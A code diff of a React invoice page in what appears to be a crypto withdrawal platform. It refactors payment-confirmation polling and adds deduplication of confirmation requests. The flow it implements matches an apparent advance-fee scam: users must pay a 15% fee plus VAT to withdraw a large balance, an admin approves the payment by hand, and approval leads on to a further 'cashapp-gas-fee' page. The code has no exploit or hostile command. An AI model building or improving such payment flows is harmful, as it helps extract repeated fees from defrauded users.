@@ -1,7 +1,13 @@
 import { useEffect, useRef, useState } from "react";
 import { useLocation } from "wouter";
 import QRCode from "react-qr-code";
-import { loadInvoiceContext, pushTransaction } from "@/hooks/use-transactions";
+import {
+  loadInvoiceContext,
+  pushTransaction,
+  loadPaymentConfirmation,
+  savePaymentConfirmation,
+  clearPaymentConfirmation,
+} from "@/hooks/use-transactions";
 import { debitAll } from "@/hooks/use-balance";
 import { useAuth } from "@/lib/auth-context";
 import { publicApi, type WalletConfig } from "@/lib/api";
@@ -67,6 +73,7 @@ export default function Invoice() {
   const [errorMsg, setErrorMsg] = useState<string>("");
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const handledRef = useRef<boolean>(false);
+  const submittingRef = useRef<boolean>(false);
 
   const [cryptoPanelOpen, setCryptoPanelOpen] = useState(false);
   const [selectedCoin, setSelectedCoin] = useState<string | null>(null);
@@ -91,6 +98,110 @@ export default function Invoice() {
     };
   }, []);
 
+  const ctx = loadInvoiceContext();
+  const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20435.65;
+  const asset = ctx?.asset ?? "USD";
+  const rawAmount = ctx?.rawAmount ?? "";
+  const txId = ctx?.txId ?? "WDL-001";
+  // Only persist/resume payment confirmations when there's a real invoice
+  // context. The placeholder txId would otherwise cause unrelated visits to
+  // share state and resume from stale data.
+  const hasInvoiceContext = !!ctx?.txId;
+
+  const feeTotal = Math.round(withdrawalAmount * FEE_RATE * 100) / 100;
+  const invoiceItems = buildInvoiceItems(feeTotal);
+  const subtotal = invoiceItems.reduce((s, i) => s + i.unitPrice * i.quantity, 0);
+  const vatRate = 0.075;
+  const vatAmount = Math.round(feeTotal * vatRate * 100) / 100;
+  const grossTotal = Math.round((feeTotal + vatAmount) * 100) / 100;
+  const totalDue = grossTotal;
+
+  function applyApprovalSideEffects() {
+    const { btcDebited, usdDebited } = debitAll();
+    if (btcDebited > 0) {
+      pushTransaction({
+        type: "Withdrawal",
+        asset: "BTC",
+        amount: `-${btcDebited.toFixed(4)} BTC`,
+        usdAmount: Math.round(usdDebited * 100) / 100,
+        address: "Approved Withdrawal",
+        status: "Completed",
+        statusType: "completed",
+      });
+    }
+  }
+
+  function startPolling(token: string) {
+    if (pollRef.current) clearInterval(pollRef.current);
+    handledRef.current = false;
+    let inFlight = false;
+    pollRef.current = setInterval(async () => {
+      if (inFlight || handledRef.current) return;
+      inFlight = true;
+      try {
+        const status = await publicApi.getRequestStatus(token);
+        if (handledRef.current) return;
+        if (status.status === "approved") {
+          handledRef.current = true;
+          if (pollRef.current) clearInterval(pollRef.current);
+          const saved = hasInvoiceContext ? loadPaymentConfirmation(txId) : null;
+          if (!saved?.approvedHandled) {
+            applyApprovalSideEffects();
+            if (hasInvoiceContext) {
+              savePaymentConfirmation({ txId, publicToken: token, approvedHandled: true });
+            }
+          }
+          setConfirmState("approved");
+        } else if (status.status === "denied" || status.status === "rejected") {
+          handledRef.current = true;
+          if (pollRef.current) clearInterval(pollRef.current);
+          if (hasInvoiceContext) clearPaymentConfirmation(txId);
+          setConfirmState("denied");
+        }
+      } catch {
+        // ignore transient polling errors
+      } finally {
+        inFlight = false;
+      }
+    }, 3000);
+  }
+
+  // Resume previously-submitted payment confirmation when the page is reopened.
+  // If admin already approved, skip straight to the next step instead of
+  // re-submitting a duplicate confirmation request.
+  useEffect(() => {
+    if (!hasInvoiceContext) return;
+    const saved = loadPaymentConfirmation(txId);
+    if (!saved) return;
+
+    let cancelled = false;
+    (async () => {
+      try {
+        const status = await publicApi.getRequestStatus(saved.publicToken);
+        if (cancelled) return;
+        if (status.status === "approved") {
+          if (!saved.approvedHandled) {
+            applyApprovalSideEffects();
+            savePaymentConfirmation({ ...saved, approvedHandled: true });
+          }
+          navigate("/cashapp-gas-fee");
+        } else if (status.status === "denied" || status.status === "rejected") {
+          clearPaymentConfirmation(txId);
+          setConfirmState("denied");
+        } else if (status.status === "pending") {
+          setConfirmState("waiting");
+          startPolling(saved.publicToken);
+        }
+      } catch {
+        // Stale/invalid token — drop it so the user can submit fresh.
+        clearPaymentConfirmation(txId);
+      }
+    })();
+
+    return () => { cancelled = true; };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [txId, hasInvoiceContext]);
+
   useEffect(() => {
     if (cryptoPanelOpen && walletConfigs.length === 0) {
       setWalletLoading(true);
@@ -114,77 +225,69 @@ export default function Invoice() {
     });
   })();
 
-  const ctx = loadInvoiceContext();
-  const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20435.65;
-  const asset = ctx?.asset ?? "USD";
-  const rawAmount = ctx?.rawAmount ?? "";
-  const txId = ctx?.txId ?? "WDL-001";
-
-  const feeTotal = Math.round(withdrawalAmount * FEE_RATE * 100) / 100;
-  const invoiceItems = buildInvoiceItems(feeTotal);
-  const subtotal = invoiceItems.reduce((s, i) => s + i.unitPrice * i.quantity, 0);
-  const vatRate = 0.075;
-  const vatAmount = Math.round(feeTotal * vatRate * 100) / 100;
-  const grossTotal = Math.round((feeTotal + vatAmount) * 100) / 100;
-  const totalDue = grossTotal;
-
   async function handleConfirmPayment() {
     if (!user) {
       setErrorMsg("You must be signed in to confirm payment.");
       setConfirmState("error");
       return;
     }
-    setErrorMsg("");
-    setConfirmState("submitting");
-    handledRef.current = false;
-    try {
-      const { request } = await publicApi.submitPaymentConfirmation({
-        name: user.name,
-        email: user.email,
-        amount: totalDue.toFixed(2),
-        currency: "USD",
-        notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT). Awaiting admin approval.`,
-      });
-      setConfirmState("waiting");
 
-      let inFlight = false;
-      pollRef.current = setInterval(async () => {
-        if (inFlight || handledRef.current) return;
-        inFlight = true;
+    // Synchronous in-flight guard prevents rapid double-clicks from racing
+    // before the disabled state on the button settles.
+    if (submittingRef.current) return;
+    submittingRef.current = true;
+
+    try {
+      // If a confirmation for this invoice was already submitted, check its
+      // current status before creating a duplicate. This prevents re-sending
+      // an already-approved (or still-pending) request to the admin.
+      const existing = hasInvoiceContext ? loadPaymentConfirmation(txId) : null;
+      if (existing) {
         try {
-          const status = await publicApi.getRequestStatus(request.publicToken);
-          if (handledRef.current) return;
+          const status = await publicApi.getRequestStatus(existing.publicToken);
           if (status.status === "approved") {
-            handledRef.current = true;
-            if (pollRef.current) clearInterval(pollRef.current);
-            const { btcDebited, usdDebited } = debitAll();
-            if (btcDebited > 0) {
-              pushTransaction({
-                type: "Withdrawal",
-                asset: "BTC",
-                amount: `-${btcDebited.toFixed(4)} BTC`,
-                usdAmount: Math.round(usdDebited * 100) / 100,
-                address: "Approved Withdrawal",
-                status: "Completed",
-                statusType: "completed",
-              });
+            if (!existing.approvedHandled) {
+              applyApprovalSideEffects();
+              savePaymentConfirmation({ ...existing, approvedHandled: true });
             }
-            setConfirmState("approved");
-          } else if (status.status === "denied" || status.status === "rejected") {
-            handledRef.current = true;
-            if (pollRef.current) clearInterval(pollRef.current);
-            setConfirmState("denied");
+            navigate("/cashapp-gas-fee");
+            return;
           }
+          if (status.status === "pending") {
+            setConfirmState("waiting");
+            startPolling(existing.publicToken);
+            return;
+          }
+          // denied/rejected/unknown: fall through to a fresh submission
+          clearPaymentConfirmation(txId);
         } catch {
-          // ignore transient polling errors
-        } finally {
-          inFlight = false;
+          // Stale or invalid token — drop it and submit fresh below.
+          clearPaymentConfirmation(txId);
         }
-      }, 3000);
-    } catch (err) {
-      const msg = err instanceof Error ? err.message : "Failed to submit payment confirmation";
-      setErrorMsg(msg);
-      setConfirmState("error");
+      }
+
+      setErrorMsg("");
+      setConfirmState("submitting");
+      try {
+        const { request } = await publicApi.submitPaymentConfirmation({
+          name: user.name,
+          email: user.email,
+          amount: totalDue.toFixed(2),
+          currency: "USD",
+          notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT). Awaiting admin approval.`,
+        });
+        if (hasInvoiceContext) {
+          savePaymentConfirmation({ txId, publicToken: request.publicToken });
+        }
+        setConfirmState("waiting");
+        startPolling(request.publicToken);
+      } catch (err) {
+        const msg = err instanceof Error ? err.message : "Failed to submit payment confirmation";
+        setErrorMsg(msg);
+        setConfirmState("error");
+      }
+    } finally {
+      submittingRef.current = false;
     }
   }
 
